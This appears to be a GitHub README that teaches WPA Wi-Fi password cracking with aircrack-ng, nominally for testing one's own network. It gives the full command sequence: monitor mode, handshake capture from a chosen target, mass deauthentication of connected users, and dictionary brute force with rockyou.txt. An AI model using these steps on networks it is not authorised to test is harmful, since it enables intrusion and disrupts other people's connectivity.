<p align="center"> 
  <img src="https://cdn-icons.flaticon.com/png/512/3178/premium/3178257.png?token=exp=1656614517~hmac=4201af74c509fc6632475be12260022b" alt="HackingWifi" width="80" height="80">
</p>
<h1 align="center">HackingWifi</h1>


This repository will detail the principle of testing your network. With <a href="https://www.aircrack-ng.org/">aircrack-ng</a>.<br>

__You can look at the script repository for hacking a wifi network. <a href="https://github.com/John-MetrosSoftware/HackingWifiScript">Link</a>.__

## Install aircrack-ng
```
sudo apt install aircrack-ng
```

## Remove unnecessary processes
This command will check and kill processes that might interfere with the aircrack-ng package:
```
sudo airmon-ng check kill
```
## Putting the wifi adapter into monitoring mode
You need to define your network interface. To do this, use the command below, it will display all available network interfaces.
```
ifconfig
```
We are interested in the `wlan0` network interface.<br>
Now we need to put our network adapter into monitoring mode.<br>
```
sudo airmon-ng start wlan0
```
## Monitoring of all wifi networks.
Start browsing wifi networks.
```
sudo airodump-ng wlan0
```
## Monitoring of a specific wifi network.
After viewing, we need to select a target for attack.<br>
The parameters we are interested in are: `bssid` and `channel`.
After the selection, we start interception on a specific access point.
```
airodump-ng --bssid <bssid> -c <cannel> -w <name_wpa_handshake> <network_interface>
```
Example:
```
airodump-ng --bssid ff:ff:ff:ff:ff:ff -c 1 -w handshake wlan0
```
## Wifi network user deauthentication
Now we need to open a new console window.<br>
Now you need to authenticate users of the wifi network. With airplay-ng.
```
aireplay-ng --deauth <number_of_users> -a <bssid> <network_interface>
```
Example:
```
aireplay-ng --deauth 0 -a ff:ff:ff:ff:ff:ff wlan0
```
## Bruteforce
After capturing the handshake, we start brute-force the password using the dictionary. You can use `rockyou.txt` located in `/usr/share/wordlists/rockyou.txt`. If it is packed in an archive, that is, the file name is `rockyou.txt.gz`, then you need to unpack it with the command below.
```
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```
We will use this dictionary for brute force, but you can use your own.
```
aircrack-ng <name_wpa_handshake> -w <path_to_dictionary>
```
Example:
```
aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
```

## Conclusion
After that, if specifically in the dictionary you specified there is a password combination that will be correct, then the password will be determined and brute force will end; if there is no such combination in the dictionary, then try in another one.
<br><br>
Here we have analyzed the easiest way to hack a wifi network using brute force.

